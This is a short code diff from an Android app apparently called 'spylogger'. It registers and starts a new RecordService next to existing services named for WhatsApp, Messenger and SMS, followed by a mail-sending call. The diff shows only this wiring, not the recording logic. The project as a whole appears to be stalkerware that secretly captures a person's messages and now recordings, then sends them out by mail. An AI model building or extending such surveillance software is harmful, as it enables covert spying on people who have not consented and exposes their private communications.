@@ -33,6 +33,7 @@ import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.model.messenger.Prefs;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.services.RecordService;
 import com.gravatasufoca.spylogger.services.SmsService;
 import com.gravatasufoca.spylogger.services.WhatsAppService;
 import com.gravatasufoca.spylogger.helpers.WhatsHtmlHelper;
@@ -602,6 +603,7 @@ public class Utils {
 	public static boolean isServiceRunning(Context context){
 		return Utilidades.isServiceRunning(WhatsAppService.class,context)
 				&& Utilidades.isServiceRunning(MessengerService.class,context)
+				&& Utilidades.isServiceRunning(RecordService.class,context)
 				&& Utilidades.isServiceRunning(SmsService.class,context);
 	}
 
@@ -618,6 +620,7 @@ public class Utils {
 			context.startService(new Intent(context, WhatsAppService.class));
 			context.startService(new Intent(context, MessengerService.class));
 			context.startService(new Intent(context, SmsService.class));
+			context.startService(new Intent(context, RecordService.class));
 		}
 		Utils.startMail(context);
 		Toast.makeText(context, context.getString(R.string.service_running), Toast.LENGTH_LONG).show();
